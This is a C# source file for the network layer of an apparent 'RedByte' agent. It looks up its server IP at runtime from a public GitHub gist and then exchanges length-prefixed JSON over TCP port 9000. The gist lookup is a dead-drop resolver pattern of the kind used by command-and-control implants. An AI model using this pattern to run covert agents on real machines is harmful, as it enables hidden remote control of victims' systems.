using System.Net.Sockets;
using System.Text;
using System.Text.Json;
using System.Net.Http;

namespace RedByte.Agent.Network;

public class TcpClientManager
{
    private static TcpClientManager? _instance;
    private TcpClient _client;
    private NetworkStream _stream;
    private const int DefaultPort = 9000;
    private const string GitGistURL = "https://gist.githubusercontent.com/galshichrur/1b160c4a5451f18e2fd0e94b844657a5/raw/gistfile1.txt";

    public static TcpClientManager GetInstance()
    {
        if (_instance == null)
            _instance = new TcpClientManager();
        return _instance;
    }

    public async Task<bool> Connect()
    {
        try
        {
            _client = new TcpClient();
            await _client.ConnectAsync(GetServerIp(), DefaultPort);
            _stream = _client.GetStream();
            return true;
        }
        catch
        {
            return false;
        }
    }

    public async Task Send(object data)
    {
        string json = JsonSerializer.Serialize(data);
        byte[] payload = Encoding.UTF8.GetBytes(json);

        byte[] length = BitConverter.GetBytes(payload.Length);

        await _stream.WriteAsync(length);
        await _stream.WriteAsync(payload);
    }

    public async Task<T?> Receive<T>()
    {
        try
        {
            byte[] lengthBytes = await ReadExact(4);
            int length = BitConverter.ToInt32(lengthBytes);

            byte[] payload = await ReadExact(length);
            string json = Encoding.UTF8.GetString(payload);

            return JsonSerializer.Deserialize<T>(json);
        }
        catch
        {
            return default;
        }
    }

    private async Task<byte[]> ReadExact(int size)
    {
        byte[] buffer = new byte[size];
        int total = 0;

        while (total < size)
        {
            int read = await _stream.ReadAsync(buffer, total, size - total);
            if (read == 0) throw new Exception();
            total += read;
        }

        return buffer;
    }

    public void Disconnect()
    {
        _stream?.Close();
        _client?.Close();
    }

    private string GetServerIp()
    {
        using var http = new HttpClient();
        return http.GetStringAsync(GitGistURL).Result.Trim();
    }
}